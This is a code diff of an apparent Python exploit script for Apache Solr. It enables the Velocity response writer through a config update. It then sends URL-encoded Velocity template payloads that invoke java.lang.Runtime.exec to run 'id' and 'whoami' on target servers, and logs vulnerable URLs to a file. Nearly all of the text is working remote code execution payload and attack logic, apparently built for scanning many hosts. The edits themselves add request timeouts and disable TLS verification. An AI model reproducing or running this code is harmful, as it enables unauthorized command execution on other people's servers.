@@ -19,7 +19,7 @@ def upconfig(url, core):
     {
       "update-queryresponsewriter": {
         "startup": "lazy",
-        "core": "velocity",
+        "name": "velocity",
         "class": "solr.VelocityResponseWriter",
         "template.base.dir": "",
         "solr.resource.loader.enabled": "true",
@@ -48,12 +48,11 @@ def attack(url):
 		
 		
 			payload = url + f'{core}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
-			restart = requests.get(payload).text
-			#print(restart)
+			restart = requests.get(payload,timeout = 5,verify=False).text
 		
 			if 'uid' in restart:
 				payload = url + f'{core}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
-				restart = requests.get(payload).text
+				restart = requests.get(payload,timeout = 5,verify=False).text
 				user = restart.split('0')[1]
 				with open('have_attack.txt','a') as f:
 					f.write(f'[*]url:{payload}\n[*]code_restart:{user}\n\n')
@@ -73,3 +72,6 @@ if __name__ == '__main__':
 		except:
 			pass
 	t.join()
+
+
+
